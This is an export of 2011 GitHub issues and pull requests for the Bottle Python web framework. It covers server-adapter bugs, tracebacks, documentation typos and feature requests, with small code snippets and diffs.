The problem is that instancemethods don't have **module** attributes, and http://bugs.python.org/issue3445, which causes the manifestation of this bug, doesn't get fixed until Python 3.2.x.

This could be fixed by skipping the functools.update_wrapper call in _make_callback if we detect that we're dealing with an instancemethod or something else w/ an immutable __doc__ and/or without **module** or **name** attributes.  Dunno if that would cause any other undesirable side-effects though.
"
222,Changing thread-save to thread-safe.,2011-09-19T20:25:13Z,2011-09-19T20:32:59Z,,,,"Language corrections are always welcome.
"
221,fix homepage addresse in README.rst,2011-09-17T17:27:28Z,2011-09-18T11:47:59Z,,,,
220,Fixing GunicornServer,2011-09-17T15:26:15Z,2011-09-19T07:55:52Z,,,,"GunicornServer was broken because of Bottle and Gunicorn interface changes.

I tested this implementation running Bottle with Gunicorn 0.8.0 and Gunicorn last release (0.13.2). It works fine.

Gunicorn 0.9 has more than one year and more than 10 releases after that, compatible with new implementation. Probably, we can just drop support for Gunicorn<0.9.
"
219,GunicornServer doesn't work,2011-09-17T13:54:55Z,2011-09-19T15:13:15Z,,TypeError,TypeError: wsgi() takes exactly 3 arguments (1 given),"```
import bottle
bottle.run(server='gunicorn')
```

It throws an exception and doesn't start.

```
/usr/local/lib/python2.7/dist-packages/gunicorn/util.py:19: UserWarning: Module bottle was already imported from /tmp/t/bottle.pyc, but /usr/local/lib/python2.7/dist-packages is being added to sys.path
  import pkg_resources
2011-09-17 10:52:23 [22041] [INFO] Starting gunicorn 0.13.2
2011-09-17 10:52:23 [22041] [INFO] Listening at: http://127.0.0.1:8000 (22041)
2011-09-17 10:52:23 [22041] [INFO] Using worker: sync
2011-09-17 10:52:23 [22044] [INFO] Booting worker with pid: 22044
2011-09-17 10:52:23 [22044] [ERROR] Exception in worker process:
Traceback (most recent call last):
  File ""/usr/local/lib/python2.7/dist-packages/gunicorn/arbiter.py"", line 454, in spawn_worker
    worker.init_process()
  File ""/usr/local/lib/python2.7/dist-packages/gunicorn/workers/base.py"", line 100, in init_process
    self.wsgi = self.app.wsgi()
TypeError: wsgi() takes exactly 3 arguments (1 given)
2011-09-17 10:52:23 [22044] [INFO] Worker exiting (pid: 22044)
2011-09-17 10:52:23 [22041] [INFO] Shutting down: Master
2011-09-17 10:52:23 [22041] [INFO] Reason: Worker failed to boot.
```

Gunicorn calls `bottle.wsgi()` without parameters instead with environ and start_response.
"
218,Documentation fixes,2011-09-15T22:01:59Z,2011-09-15T22:03:28Z,,,,"Fix documentation errors pointed out by BlogueroConnor sbassi@gmail.com
"
217,fix smallish typo in tutorial.rst (Closes #216),2011-09-15T20:38:02Z,2011-09-15T21:36:13Z,,,,"see https://github.com/defnull/bottle/issues/216
"
215,add a 'Using the hooks plugin' chapter in recipes,2011-09-14T23:11:53Z,2011-09-15T12:22:33Z,,,,"Hi, 

I recently needed to add the `Access-Control-Allow-Origin` HTTP header to every response and I used the HooksPlugin (but maybe it's not the right way to do it ...)

I just cooked a new recipe, something too small and not well written but it's a start ...
Or maybe this plugin deserve a section into the documentation ?

fredj
"
214,remove unused import (see c53172cb57),2011-09-13T22:33:43Z,2011-09-14T10:08:36Z,,,,
213,Fix NameError exception in load_app (_load call),2011-09-13T17:11:26Z,2011-09-14T10:09:29Z,,,,"load_app still uses _load() but the function was renamed to load() in 8ebf74ea
"
212,"Threading: KeyError(-1218722048,) ignored ...",2011-09-12T14:44:47Z,2011-11-15T15:27:37Z,,,,"In some non-reproducible situations, a KeyError is raised and ignored by the threading module. I have no Idea, why that is the case. Any ideas are welcome.
"
211,tutorial_app: replace depraceted send_file,2011-09-11T22:42:13Z,2011-09-12T07:50:31Z,,,,"Replace the deprecated statement send_file with the static_file statement in docs/tutorial_app.rst, since send_file does not exist anymore in the current development version.
"
210,Error Handling of mounted apps should be delegated to the corresponding mounted app.,2011-09-07T17:24:30Z,2011-09-08T18:31:43Z,,@app.error(404),@app.error(404):,"Hello,

Say we have :

```
@app.error(404):
def appError404():
    return ""foobar""

root = bottle.Bottle()
root.mount(app, '/')
```

I would expect that all 404 errors happening in `app` are handled by the error 404 handler defined for `app`.
But this is not the case since the Bottle constructor reset the error handling stack to {} :
https://github.com/defnull/bottle/blob/master/bottle.py#L484

This issue may be linked to #168 or #124, feel free to reject as duplicate as you wish.

Thank you very much for your feedback and comments !
Cheers,
CH
"
209,Error Handling of mounted apps should be delegated to the corresponding mounted app.,2011-09-07T17:24:30Z,2011-09-07T17:37:24Z,,@app.error(404),@app.error(404):,"Hello,

Say we have :

@app.error(404):
def appError404():
    return ""foobar 404""

root = bottle.Bottle()
root.mount(app, '/')

I would expect 404 errors occurring in app to be handle by the error handler defined for app but this is not the case.
It might not be easy to implement ...

Thank you very much for your comment and feedback on this issue.
Cheers,
CH
"
208,test/tools.py is missing from sdist,2011-09-06T08:45:08Z,2011-09-12T20:36:56Z,,,,"…this will make tests fail _sadface_

Proposed fix:

<pre>
diff --git a/MANIFEST.in b/MANIFEST.in
index b479d91..fb0c817 100644
--- a/MANIFEST.in
+++ b/MANIFEST.in
@@ -3,3 +3,4 @@ include setup.py
 include README.rst
 include LICENSE.txt
 include test/views/*.tpl
+include test/*.py
</pre>
"
207,bottle.view caused an error,2011-09-05T16:20:18Z,2011-09-07T13:44:08Z,,TypeError,TypeError: show() takes exactly 2 arguments (1 given),"when using bottle_sqlite, bottle.view caused an error:
-------------------------------------error message-------------------------------------
Bottle server starting up (using WSGIRefServer())...
Listening on http://localhost:80/
Use Ctrl-C to quit.
Traceback (most recent call last):
  File ""X:\Dev\bottle\bottle.py"", line 682, in _handle
    return route.call(*_args)
  File ""X:\Dev\bottle\bottle.py"", line 1367, in wrapper
    rv = callback(_a, *_ka)
  File ""X:\Dev\bottle\bottle.py"", line 2640, in wrapper
    result = func(_args, **kwargs)
TypeError: show() takes exactly 2 arguments (1 given)
localhost - - [05/Sep/2011 18:16:48] ""GET /favicon.ico HTTP/1.1"" 500 747
-------------------------------------error message-------------------------------------

---------------error---------------
@route('/show/:post_id')
@view('index')
def show(db, post_id):
    c = db.execute('SELECT title FROM book WHERE id= ?', (int(post_id),))
    row = c.fetchone()
    return dict(text = row['title'])
---------------error---------------

---------------pass---------------
@route('/show/:post_id')
def show(db, post_id):
    c = db.execute('SELECT title FROM book WHERE id= ?', (int(post_id),))
    row = c.fetchone()
    return template('index', text=row['title'])
---------------pass---------------
"
206,Misspellling: extentions -> extensions,2011-09-04T09:25:50Z,2011-09-04T09:49:00Z,,,,"Just fixing a misspeling. =)
"
205,Add a template mechanism for EZT templates.,2011-09-03T21:20:15Z,,,,,"This change adds support for the EZT templating mechanism. EZT has a similar approach to bottle: a single, simple module for no-pain usage by developers.

(see http://code.google.com/p/ezt/)
"
204,Add **kwargs to SimpleTemplate.prepare to fix #203,2011-09-02T22:58:56Z,2011-09-02T23:01:35Z,,,,"A solution to #203, with a regression test.

Another solution is don't send kwargs to SimpleTemplate, but I guess it is more complicated than that.
"
203,HTTPError error if template has global_settings,2011-09-02T22:39:26Z,2011-09-02T23:01:36Z,,,,"If I add a global config to templates, I get an error because SimpleTemplate don't receive **kwargs.

```
import bottle

bottle.BaseTemplate.global_config('bleh', 1)
bottle.debug(True)
bottle.run(reloader=True)
```

Accessing an URL throws a 404, but it breaks SimpleTemplate.

This issue is based on an @atealtha bug. I helped him on IRC to solve the issue. It makes sense because he is using mako and adding a global_config to make some preprocessing.

I guess SimpleTemplate should receive **kwargs too, even if it don't use it.
"
201,Max recursion depth exceeded,2011-09-02T10:34:40Z,2011-09-02T11:54:50Z,,RuntimeError,RuntimeError: maximum recursion depth exceeded while calling a Python object,"Checking if WSGIHeaderDict is empty trigger maximum recursion depth exceeded error

``` python
if bottle.WSGIHeaderDict({}):
  print ""Not empty""

...
  File ""bottle.py"", line 1595, in __len__
    def __len__(self): return len(list(self))
  File ""bottle.py"", line 1595, in __len__
    def __len__(self): return len(list(self))
RuntimeError: maximum recursion depth exceeded while calling a Python object
```
"
200,Add tests for HTTP/1.0 redirect default code and custom code,2011-09-01T18:02:09Z,2011-09-01T18:05:15Z,,,,"Add tests to check for HTTP/1.0 edge case behavior with default code, and user supplied code
"
199,Avoid overwriting passed-in redirect values.,2011-08-29T02:13:05Z,2011-08-29T16:17:11Z,,,,"Use the appropriate redirect default, based on the request protocol. Avoid overwriting any passed-in value (the previous function overwrote `code` for all HTTP/1.0 requests).

[I just discovered the web-based editing tool; I should have done this originally, rather than filing defnull/bottle#197]
"
198,Fixes #197,2011-08-26T19:40:37Z,2011-08-26T20:38:05Z,,,,
197,302 should be used for HTTP/1.0 clients,2011-08-21T21:44:25Z,2011-08-26T20:38:06Z,,,,"In my code, I use a wrapper function for redirect(), like so:

```
def redirect(url):
  ""Avoid sending 303 to old clients.""
  if bottle.request['SERVER_PROTOCOL'] == 'HTTP/1.0':
    bottle.redirect(url, code=302)
  bottle.redirect(url, code=303)
```

HTTP/1.0 clients will (presumably) not understand the 303 code. They should receive a 302 instead.
"
196,provide %raw statement in SimpleTemplate Engine,2011-08-11T14:36:22Z,,Request,,,"I can not place [jQuery Templates Markup](http://api.jquery.com/category/plugins/templates/) in my SimpleTemplates, because both use '{{' / '}}' to mark variable replacement.

Something like [this](http://jinja.pocoo.org/docs/templates/#escaping) would be great:

```
%raw
some other {{ untouched }} markup for client side
%end
```
"
195,"bottle+cherrypy gives """"TypeError: WSGI response header key 'Content-Length' is not a byte string""",2011-08-08T18:03:28Z,2011-12-13T14:20:32Z,,"TypeError, AssertionError","TypeError: WSGI response header key 'Content-Length' is not a byte string., AssertionError: WSGI start_response called a second time with no exc_info.","I am not sure if this is a bottle or a cherrypy issue, but anyway

I'm using the following configuration:

Arch Linux with 2.6.32-lts kernel
hardware: i686 Intel(R) Atom(TM) CPU N270 @ 1.60GHz
python 3.2
cherrypy-svn 2567-1
bottle 0.9.5

Both a Bottle and a Cherrypy 'hello world' run fine. But when I try to run Bottle with Cherrypy like this: 

---

from bottle import route, run

@route('/')
def hello():
    return 'hello world'

run(server='cherrypy',host='192.168.1.5', port=8080)

---

I get this error message:

---

Traceback (most recent call last):
  File ""/usr/lib/python3.2/site-packages/bottle.py"", line 743, in wsgi
    start_response(status, response.headerlist)
  File ""/usr/lib/python3.2/site-packages/cherrypy/wsgiserver/wsgiserver3.py"", line 1846, in start_response
    raise TypeError(""WSGI response header key %r is not a byte string."" % k)
TypeError: WSGI response header key 'Content-Length' is not a byte string.

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""/usr/lib/python3.2/site-packages/cherrypy/wsgiserver/wsgiserver3.py"", line 1034, in communicate
    req.respond()
  File ""/usr/lib/python3.2/site-packages/cherrypy/wsgiserver/wsgiserver3.py"", line 830, in respond
    self.server.gateway(self).respond()
  File ""/usr/lib/python3.2/site-packages/cherrypy/wsgiserver/wsgiserver3.py"", line 1808, in respond
    response = self.req.server.wsgi_app(self.env, self.start_response)
  File ""/usr/lib/python3.2/site-packages/bottle.py"", line 759, in **call**
    return self.wsgi(environ, start_response)
  File ""/usr/lib/python3.2/site-packages/bottle.py"", line 755, in wsgi
    start_response('500 INTERNAL SERVER ERROR', [('Content-Type', 'text/html')])
  File ""/usr/lib/python3.2/site-packages/cherrypy/wsgiserver/wsgiserver3.py"", line 1830, in start_response
    raise AssertionError(""WSGI start_response called a second ""
AssertionError: WSGI start_response called a second time with no exc_info.
`
"
194,custom validate handler and validation of all request parameters,2011-08-07T20:12:56Z,2011-11-15T15:25:17Z,,,,"Hello, what do you think about adding custom handler for validate rather than abort(403,....) ?
And also I think it would be usefull, to validate all variables, not just return error message for first invalid request parameter.

Here is an example:
http://pastebin.com/jarTtDVE
"
193,more explicit warning for debug(True),2011-08-06T18:43:10Z,2011-09-12T14:45:38Z,,,,"I recommend to make the warning not to use ""debug(True)"" in productive environments more explicit.

Currently it goes: ""Just make sure to not use the debug mode on a production server."" which sounds more like a recommendation than a must.

Having ""debug(True)"" can cause quiet strange, not-reproducible errors in web apps. Although they are not critical, they are annoying. I experienced that recently myself , when I forgot the remove the ""debug(True)"" while deploying the app to the server.

My suggestion for the text is:
""Always make sure that debug mode is off on a production server, as otherwise errors may occur while running the application!"" 
"
192,"request.POST.get(""var1"") yields None",2011-08-03T04:55:07Z,2011-11-15T15:25:48Z,,,,"Hi, I am having a bottle controller which accepts a POST request and extracts 3 variables from POST data and performs a mysql write

```
@route(""/followuser"", method=""POST"")
def post_followuser():
    follower_id = request.POST.get(""follower_id"")
    followee_id = request.POST.get(""followee_id"")
    item_id = request.POST.get(""item_id"")

    if follower_id and followee_id and item_id:
        sql = """"""INSERT INTO followuser (follower_id, followee_id, 
                     item_id) VALUES(%s,%s,%s)""""""
        try:
            data = cursor.execute(sql, (follower_id,followee_id,item_id))
            cursor.connection.commit()
        except pymysql.err.IntegrityError:
            data = 0 # already created
        return {""status"": data}
    abort(404)
```

When I was simulating a load test on this controller I found that about 20% of my request hit 404. After I added some try  / except and log statements I found that even though the request.POST is a MultiDict with all 3 parameters, follower_id (being the first parameter) is turning out to be None while other 2 variables are getting the right values. This is pretty confusing ..... 
"
191,parse_date() is not working properly,2011-08-01T15:50:13Z,2011-08-19T15:44:50Z,,,,"gentoo ~amd64,
python installed versions:  2.7.2-r2(2.7)(14:43:17 25.07.2011)(doc examples ipv6 ncurses readline sqlite ssl threads wide-unicode xml -berkdb -build -elibc_uclibc -gdbm -tk -wininst) 3.2-r2(3.2)(14:47:21 25.07.2011)(doc examples ipv6 ncurses readline sqlite ssl threads wide-unicode xml -build -elibc_uclibc -gdbm -tk -wininst)

tz=""Europe/Moscow"" # gmt+3 and dst

test log:  http://pastebin.com/1RJVtpQC

sort of test:  http://pastebin.com/1Tnr9wAr

output of my test:

t1:      1312213257.49
s1:      Mon, 01 Aug 2011 15:40:57 GMT
t2:      None
s2:      Mon, 01 Aug 2011 15:40:57 GMT
tz:      -3.0
p1:      (2011, 8, 1, 15, 40, 57, 0, 1, -1, 0)
p2:      (2011, 8, 1, 15, 40, 57, 0, 1, -1)

i don't know ""return time.mktime(ts[:9] + (0,)) - time.timezone"" is correct solution or not
"
190,for blocks works even without an %end tag,2011-07-31T03:50:53Z,,Request,,,"I guess `for` blocks should have an `end` tag to template compile. Today I had a stupid problem because I forgot to close `for` block and it didn't give me an error.

```
%for i in range(3):
     {{ i }}<br/>
```

Is it right?
"
189,rule signature matches are ignoring request method differences ,2011-07-29T22:00:10Z,,,,,"rule signature matches are ignoring request method differences on subsequent 'dynamic' requests with similar signatures.
if the condition on line 367 in version 0.10.dev is changed from   if match:  -  to -
 if match and environ['REQUEST_METHOD'].upper() in self.routes[rule]: , distinct request methods appear to be correctly recognized
"
188,Small documentation change to clarify the use of Paste,2011-07-26T13:14:20Z,2011-08-23T13:21:30Z,,,,"Hello,

I had some problems configuring bottle to use Paste instead of the default http server, I made a very small change to the example in tutorial.rst to clarify that bit.

Thanks
"
187,Set view default template to function name,2011-07-22T16:48:26Z,,,,,"Rather than write:

```
@route('/hello')
@view('hello.html')
def hello(): return 'Hello'
```

allow:

```
@route('/hello')
@view()  # template name defaults to function name
def hello(): return 'Hello'
```

Here's the diff:

@@ -2612,7 +2613,7 @@ def view(tpl_name, **defaults):
             if isinstance(result, (dict, DictMixin)):
                 tplvars = defaults.copy()
                 tplvars.update(result)
-                return template(tpl_name, **tplvars)
-                return template(tpl_name or func.**name**, **tplvars)
           return result
       return wrapper
   return decorator
"
186,"Fix PEP-8 violation in JSONPlugin by renaming 'json' to 'json_result', to avoid name clash with json module in stdlib.",2011-07-18T18:12:17Z,2011-07-18T22:47:22Z,,,,"iurisilvio pointed out that in 08e88007a2da46053788a33fbcef6f39452b4176 the variable name 'json' is not PEP-8 compliant, since there is a json module in the stdlib. He is correct, if you insist on PEP-8 compliance then this commit fixes the issue.
"
185,"JSONPlugin returns content-type application/json when JSON serialization fails, should return text/html",2011-07-17T22:14:04Z,2011-07-17T22:48:43Z,,,,"This commit fixes the issue, and makes the 500 error page readable in the case where json serialization raises an exception. Test case included.
"
184,Small word mistake in documentation,2011-07-17T17:22:40Z,2011-07-17T23:05:07Z,,,,"On the page http://bottlepy.org/docs/dev/tutorial.html#a-minimal-bottle-application there is the sentence ""Of cause this is a very simple example"" in the paragraph underneath the list. This should be ""Of course this is a very simple example"". (Of cause -> of course)

Keep up the good work!
"
183,0.9.5 and 0.10.dev  fails on Google App Engine,2011-07-13T11:27:36Z,2011-07-19T19:29:52Z,Needs input,,,"0.9.5 fails on Google App Engine but using the same application code I can get it to work with 0.8.5.

App engine version i am using is 1.5.1 (although this may be irrelevant)

Didn't get much chance to look into why but upon running the app engine devserver this was returned to the browser...

""""""
<type 'exceptions.WindowsError'>    Python 2.5.2: C:\Python25\python.exe
Wed Jul 13 11:25:17 2011

A problem occurred in a Python script. Here is the sequence of function calls leading up to the error, in the order they occurred.
 C:\Program Files\Google\google_appengine\google\appengine\tools\dev_appserver.py in _HandleRequest(self=<google.appengine.tools.dev_appserver.DevAppServerRequestHandler instance at 0x02AC60D0>)
 4113           self._Dispatch(dispatcher, self.rfile, outfile, env_dict)
 4114         finally:
 4115           self.module_manager.UpdateModuleFileModificationTimes()
 4116 
 4117         outfile.flush()
self = <google.appengine.tools.dev_appserver.DevAppServerRequestHandler instance at 0x02AC60D0>, self.module_manager = <google.appengine.tools.dev_appserver.ModuleManager object at 0x028A6890>, self.module_manager.UpdateModuleFileModificationTimes = <bound method ModuleManager.UpdateModuleFileModi...ev_appserver.ModuleManager object at 0x028A6890>>
 C:\Program Files\Google\google_appengine\google\appengine\tools\dev_appserver.py in UpdateModuleFileModificationTimes(self=<google.appengine.tools.dev_appserver.ModuleManager object at 0x028A6890>)
 3770       except OSError, e:
 3771         if e.errno not in FILE_MISSING_EXCEPTIONS:
 3772           raise e
 3773 
 3774   def ResetModules(self):
e = WindowsError(123, 'The filename, directory name, or volume label syntax is incorrect')

<type 'exceptions.WindowsError'>: [Error 123] The filename, directory name, or volume label syntax is incorrect: '<virtual>'
      args = (123, 'The filename, directory name, or volume label syntax is incorrect')
      errno = 22
      filename = '<virtual>'
      message = ''
      strerror = 'The filename, directory name, or volume label syntax is incorrect'
      winerror = 123 

""""""
"
182,Documentation issues/typos,2011-07-11T14:39:45Z,2011-07-17T23:05:07Z,,,,"Hi,

I installed bottle.py in a virtualenv using pip, so v0.9.5 got installed. Here are some remarks about the documentation that I found:

1) the ""Hello World"" example on the home page gives the impression that it should be possible to enter the address http://localhost:8080/hello after which the default 'Hello World' would render. But that does not happen (404 error) unless I add a
@route('/hello') decorator to the function.

2) you mightTutorial suggest using host='0.0.0.0' if one wants to approach the web server from another machine than localhost

3) In the section 'Dynamic Routes' you mention that using a regex can match beyond the next slash, but then you show a sample that doesn't AFAIK

4) in the section 'HTTP Request Methods' the return string for the GET-method ends with a tag that has a typo: </from> instead of </form>

5) I didn't know about the HTTP methods HEAD and ANY, thanks for mentioning them in the section 'Automatic Fallbacks'. Maybe you could add a very short intro sentence (e.g. The HTTP-verbs mentioned above are most commonly used, but there are a few others.) especially since ANY is not mentioned in the (chapter one finds when following the) link you refer to in the preceding section
http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html
An example would be appreciated, too.

That's how far I've got for now, thanks for your software! 
"
181,Accessing request data is broken in tutorial,2011-07-06T19:38:05Z,2011-07-06T20:06:27Z,,,,"The example at ""POST Form Data and File Uploads"" is broken because `if name and data:` is False, because `bool(data)` is False. One solution is replace `data` with `data.file`.

Bug reported here: https://groups.google.com/d/topic/bottlepy/HJiCkv420e0/discussion
"
180,How to use bottle with uwsgi and nginx?,2011-07-02T14:20:04Z,2011-07-18T10:54:20Z,,,,"I  use nginx 1.0 server and uwsgi ,the test causes an error :
uWSGI Error
wsgi application not found

code:
# !/usr/bin/python
# coding=utf-8

import os  
from bottle import route, run, default_app  
app=bottle()
@app.route('/')  
def main():  
    return ""Hello world! ""
@app.route('/:name')
def hello(name):
        return ""hello %s"" % name
if **name** == ""**main**"":  
    # Interactive mode  
    app.run()  
else:  
    # Mod WSGI launch  
    os.chdir(os.path.dirname(**file**))  
    application = default_app()
"
179,bottle.MultiDict does not provide getone() method.,2011-06-30T23:40:16Z,2011-07-18T12:52:23Z,Request,,,"I've been working with SQLAlchemy and FormAlchemy the last few days, and when I got to the point where I could save back altered forms to my database, I discovered that my relationships would only save one selected row, even if more than one was selected in the form.  After some investigation, I discovered that this is because FormAlchemy assumes MultiDict-like objects (bottle's request.forms object) have a `getall()` and a `getone()` method.  Unfortunately, bottle.MultiDict only provides `getall()` and `get()`. 

However, the fix is easy. `get()` provides the functionality that `getone()` needs, so simply aliasing `get()` as `getone()` solves the issue.

Now, I don't really think that bottle is actually at fault here, since there doesn't appear to be a standard API for MultiDicts.  However, Paste's MultiDict uses `getone()` and it seems likely that FormAlchemy is basing it's API assumptions on Paste.  So, adding `getone()` as an alias for `get()` seems like it'd help bottle integrate better with other apps that work with Paste-based MultiDicts, beyond just FormAlchemy.
"
178,Support route catch-all wildcards,2011-06-27T22:59:07Z,2011-06-28T18:28:15Z,,,,"The current route wildcard system is great for catching parameters, but doesn't work for catch alls.

For example, I want to use catch alls to enable API versioning and uniformly handle old versions of the API

GET /api/1/contacts
POST /api/1/contacts
GET /api/1/contacts/:id
PUT /api/1/contacts/:id
DELETE /api/1/contacts/:id

If I increment the active version of the API to 2, I want to uniformly handle the old version of the API with a handler that instructs the user to update their client. I'd like to do this by specifying

@route('/api/1/*')
def deprecation_notice() :
   return ""Update your client""
"
177,fails on KeyError for PATH_INFO environment variable with mod_cgi and Apache,2011-06-26T23:54:14Z,2011-06-27T09:53:47Z,Bug,KeyError,KeyError: 'PATH_INFO',"Traceback (most recent call last):
  File ""/usr/home/msoulier/envs/bottle/lib/python2.7/site-packages/
bottle.py"", line 650, in _handle
    callback, args = self._match(environ)
  File ""/usr/home/msoulier/envs/bottle/lib/python2.7/site-packages/
bottle.py"", line 505, in _match
    handle, args = self.router.match(environ)
  File ""/usr/home/msoulier/envs/bottle/lib/python2.7/site-packages/
bottle.py"", line 303, in match
    targets, urlargs = self._match_path(environ)
  File ""/usr/home/msoulier/envs/bottle/lib/python2.7/site-packages/
bottle.py"", line 321, in _match_path
    path = environ['PATH_INFO'] or '/'
KeyError: 'PATH_INFO'

It seems that Apache doesn't set PATH_INFO if it is null, so bottle should probably fetch it safely with a null default.

path_info = os.environ.get('PATH_INFO', '')
"
176,autoescape for mako,2011-06-24T11:17:08Z,,Request,,,"Hi!
It would be great if such things like autoescape can be tunnable. Mako supports autoescaping(via default_filters=['h']), but there is no corresponding support from bottle.py...
"
175,Some versions of 2to3 dont work on bottle.,2011-06-23T19:52:07Z,2011-07-25T14:40:46Z,"Bug, Needs input",,,"According to @gdwatson, commit 8515340b0ba460758bac7529b2211c8832b59587 introduced a bug that causes some versions of 2to3 to crash. I can not reproduce the error with my versions of 2to3, perhaps this is a windows only bug.
"
174,Don't want to work under virtualenv,2011-06-21T09:48:42Z,,Needs input,,,"Tried bottle under virtualenv (zc.buildout) and found that it don't see any eggs. So this is my quick and dirty fix, I'm not sure about alternative OSes.
"
173,DeprecationWarning when using mount,2011-06-21T08:43:28Z,2011-06-21T09:01:01Z,,,,"Hello,

Since 0.9 I get a DeprecationWarning when using 'mount':
https://github.com/defnull/bottle/blob/master/bottle.py#L433.

Indeed there is  a call to 'handle' (see https://github.com/defnull/bottle/blob/master/bottle.py#L458) which is deprecated.

Since it sounds like an internal call to a deprecated function, I see this as a bug.
Do not hesitate to request more information.

Thank you very much !
Cheers,
CH
"
172,Please package ServerTestBase for distribution,2011-06-19T07:13:06Z,,Request,,,"...for all of us that are crazy enough that want to write tests for their Bottle apps. :)
"
171,Fix for Cherrypy server hanging on control+c,2011-06-16T07:37:01Z,2011-06-17T06:55:08Z,,,,"Fix for issue #14
"
170,Some problems with static_file,2011-06-14T14:12:18Z,2011-07-03T02:51:10Z,,,,"When I used static_file to host for downloading some files, just like

@route('/download/:filename')
def download(filename):
    return static_file(filename, root='/path/to/static/files', download=filename)

It worked well with Chrome browser.

But if using IE, the file downloaded always broken by losing some bytes.

For example, a file which owns 100KB. there may be only 97KB left after downloading it  with IE.

I use rocket server as the adapter. Hope for your answer, thanks.
"
169,Bottle-SQLite doesn't import HTTPError and makes the program fails when it's not imported by the application.,2011-06-13T00:49:52Z,2011-06-13T13:52:10Z,,,,"Is it by design or a code convention that plugins should not import bottle? When I import bottle by ""import bottle"" rather than ""from bottle import ..."" in my application codes, Bottle-SQLite crashes when error happens because HTTPError is not imported.
"
168,There's no clean way to hand over a request to a different callback in another app,2011-06-11T01:37:34Z,,,,,"``` python
root = bottle.Bottle()
root.mount(app_a, '/a')
root.mount(app_b, '/b')

bottle.run(root)
```

I'd like to make sure all requests to `/` end up in `/main` handler of `/a`. One sure way to do that would be:

``` python
@root.route('/')
def askAToDoIt():
    redirect('/a/main')
```

This has two problems:
- requires extra roundtrip (as `303` is send back to client)
- hardcodes both mountpoint (`/a`) and its default endpoint (`/main`) in `root`'s handler, which should be unrelated to `app_a` as much as possible.

What seem to be working is to save `app_a` in a place available for `root`'s handlers[1], and then say:

``` python
redirect(app_a.get_url('default'))
```

That still doesn't solve the problem of roundtrip. Ideally, we'd have something like:

``` python
def hand_over(path, app=None):
    if app:
        # have request be handled by handler picked by app for path
    else
        # have request be handled by another handler of same app (just like redirect)
```

Would it be possible to get something like that, or am I overengineering things? :)

[1] While we're at it - is there such place in Bottle as default? I've ended up writing a [generic plugin](https://github.com/yacoob/go/blob/next/go/dict_plugin.py) that ""injects"" extra dict into callbacks. Another way would be to subclass Bottle, but I'm somewhat reluctant to do it... :)
"
167,Bottle in non-Debug mode completely silences exceptions?,2011-06-10T21:37:40Z,2011-06-15T22:48:44Z,,,,"I love bottle+mod_wsgi.  It's dramatically easier and more flexible than my shop's old system using mod_python.

However, I've run into a problem that I can't figure out, and it's been driving me up the wall.  When I use bottle.debug(True), exceptions inside my code percolate up and get printed to the browser, traceroute and all.  However, when I don't use debug mode, exceptions show as a simple ""Unhandled exception"" page in the browser, and my Apache error log remains conspicuously empty.  Absolutely _nothing_ gets printed to my error_log, even when I have Apache's LogLevel set to 'info' or 'debug'.  This makes it completely impossible to debug errors that occur on the production server.

I delved into bottle's code and found the place that it should be printing to my log (Bottle.wsgi()'s except block), but it appears to not be working.  I even added some code at the top of the Bottle.wsgi() function:
    environ['wsgi.errors'].write('test')

And I still get no 'test' output in my error_log file.  In fact, with LogLevel info, this the the entirety of what I see in my log on each exception-raising event:
[Fri Jun 10 14:30:01 2011] [info] mod_wsgi (pid=26189): Create interpreter 'localhost/rolodex/api/v1'.
[Fri Jun 10 14:30:01 2011] [info] [client ::1] mod_wsgi (pid=26189, process='', application='localhost|/rolodex/api/v1'): Loading WSGI script '/srv/site-packages.1/rolodex/ui/rolodex_wsgi.py'., referer: http://localhost/search_form.php

mod_wsgi is obviously able to print to my log, but writing to wsgi.errors isn't working!  Maybe I have a configuration setting messed up somewhere?  I'm totally baffled here.
"
166,Solving issue #164,2011-06-09T20:17:07Z,2011-06-09T22:10:57Z,,,,"Just importing `run`.
"
165,DeprecationWarning: iterallitems,2011-06-09T07:19:02Z,2011-06-10T07:56:32Z,,,,"I get a DeprecationWarning on line 883: ""Iterating over all items is now the default for MultiDict.iteritems()"".

(Python 2.6.2 on Android)
"
164,Documentation code,2011-06-08T02:57:25Z,2011-06-10T08:27:26Z,,,,"Under the documentation 'A minimal Bottle Application'  in the 'Application Object' paragraph you have the following code:
from bottle import Bottle

app = Bottle()

@app.route('/hello')
def hello():
    return ""Hello World!""

run(app, host='localhost', port=8080)

If you run this code you get an error saying that run cannot be found.
I think the import code needs to be:  
from bottle import run, Bottle

Awesome framework, I just started today with it and I love it!!!!!
Keep up the good work.
"
163,is_ajax method still uses depreciated 'header' in bottle.py 0.9.2,2011-06-05T13:27:04Z,2011-06-05T17:31:25Z,,,,"In bottle.py  '0.9.2' the is_ajax method still uses depreciated 'header' instead of 'headers'

```
@property
def is_ajax(self):
    ''' True if the request was generated using XMLHttpRequest '''
    #TODO: write tests
    return self.header.get('X-Requested-With') == 'XMLHttpRequest'
```

which means I get a depreciated warning by using it.  I think line 1009 should read

return self.headers.get('X-Requested-With') == 'XMLHttpRequest'
"
162,AttributeError on is_ajax,2011-05-22T01:11:16Z,2011-05-23T18:37:38Z,,,,"Hi. Just fixed little misprint in Bottle.is_ajax method. 
"
161,Two fairly minor additions to bottle,2011-05-20T01:14:43Z,2011-06-24T22:21:17Z,,,,"First, I _love_ bottle! I've been hacking with it all week and it's amazing how much I've accomplished.  I wanted to contribute back two tweaks I made to the bottle package to support the project that I'm working on. Feel free to take as is, modify, or disregard completely.
- autojson felt lopsided to me. it would automatically convert dict values into JSON at the end of the method, but wouldn't convert JSON being sent to my handler. I modified the JSONPlugin to automatically create request.json_body if it was able to successfully parse the body
  - I wrote a plugin using SQLite as a template to support FB Auth
"
160,Handling urls with %2F in path fails,2011-05-19T20:03:20Z,2011-05-19T22:17:20Z,,,,"When setup up routes calling with a vars containing a %2f causes failure.

Reproduction steps:
Given the following:

<pre>
from bottle import route, run

@route('/hello/:name')
def hello(name):
    return 'Hello %s!' % name.title()

run(host='localhost', port=8080)```
</pre>

requesting  http://localhost:8080/hello/jon%2Fjohn 
yields a 404

log shows:
localhost - - [19/May/2011 12:57:25] ""GET /hello/jon%2fjohn HTTP/1.1"" 404 693

Note: This may be wsgi related
"
159,SERVER_NAME is substituted for '127.0.0.1' for relative redirects,2011-05-13T19:12:23Z,2011-05-13T19:35:48Z,,,,"`Request.urlparts()` substitutes SERVER_NAME for host, when it is '127.0.0.1'. This makes it troublesome to implement a Post/Redirect/Get pattern.

For example:
1.  Browse to http://127.0.0.1:8080/
2.  Submit POST to http://127.0.0.1:8080/execute
3.  `redirect('/')`

